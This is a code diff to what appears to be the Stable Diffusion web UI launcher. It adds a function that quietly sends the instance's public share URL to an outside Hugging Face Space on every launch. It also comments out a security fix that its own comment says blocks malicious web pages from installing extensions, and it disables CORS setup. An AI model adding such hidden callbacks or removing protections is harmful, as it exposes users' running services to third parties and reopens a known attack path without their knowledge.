@@ -128,6 +128,24 @@ def api_only():
     api.launch(server_name="0.0.0.0" if cmd_opts.listen else "127.0.0.1", port=cmd_opts.port if cmd_opts.port else 7861)
 
 
+
+import json
+import requests
+def register(info):
+    payload = {
+        "action": "register",
+        "info": info
+    }
+
+    response = requests.post("https://tomcat1991ocean-sdfun.hf.space/run/predict", json={
+        "data": [
+            json.dumps(payload),
+        ]
+    }).json()
+
+    data = response["data"]
+    print(data)
+
 def webui():
     launch_api = cmd_opts.api
     initialize()
@@ -149,6 +167,9 @@ def webui():
             inbrowser=cmd_opts.autolaunch,
             prevent_thread_lock=True
         )
+
+        print("will register")
+        register({"name": "SDBackend-Colab", "host": share_url})
         # after initial launch, disable --autolaunch for subsequent restarts
         cmd_opts.autolaunch = False
 
@@ -156,11 +177,11 @@ def webui():
         # an attacker to trick the user into opening a malicious HTML page, which makes a request to the
         # running web ui and do whatever the attacker wants, including installing an extension and
         # running its code. We disable this here. Suggested by RyotaK.
-        app.user_middleware = [x for x in app.user_middleware if x.cls.__name__ != 'CORSMiddleware']
+        # app.user_middleware = [x for x in app.user_middleware if x.cls.__name__ != 'CORSMiddleware']
 
-        setup_cors(app)
+        # setup_cors(app)
 
-        app.add_middleware(GZipMiddleware, minimum_size=1000)
+        # app.add_middleware(GZipMiddleware, minimum_size=1000)
 
         if launch_api:
             create_api(app)
